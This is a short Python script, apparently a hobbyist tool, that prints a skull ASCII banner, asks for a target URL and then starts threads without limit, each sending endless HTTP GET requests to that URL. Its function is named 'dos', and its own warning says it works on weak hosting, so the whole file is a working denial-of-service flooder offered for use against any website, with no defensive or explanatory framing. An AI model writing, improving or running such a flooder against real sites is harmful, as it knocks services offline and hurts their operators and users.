import threading
import requests

icon = """
███████████████████████████████████
███████████▀▀▀░░░░░░░▀▀▀███████████
████████▀░░░░░░░░░░░░░░░░░▀████████ 
███████│░░░░░░░░░░░░░░░░░░░│███████ 
███████░│▐███▀▀░░▄░░▀▀███▌│░███████ 
██████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████ 
██████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██████ 
████████▄─┘██▌░░░░░░░▐██└─▄████████ 
█████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████ 
████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████████ 
█████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████ 
███████████▄░░░░░░░░░░░▄███████████ 
██████████████▄▄▄▄▄▄▄██████████████ """

print(icon)

print("quit - exit of the app\n[!] WARNING: This loads the system very much.\nIt works on weak hosting\n")
url = input("enter URL: ")

if url == "quit":
  exit()

def dos():
 while True:
  requests.get(url)
  
while True:
 threading.Thread(target=dos).start()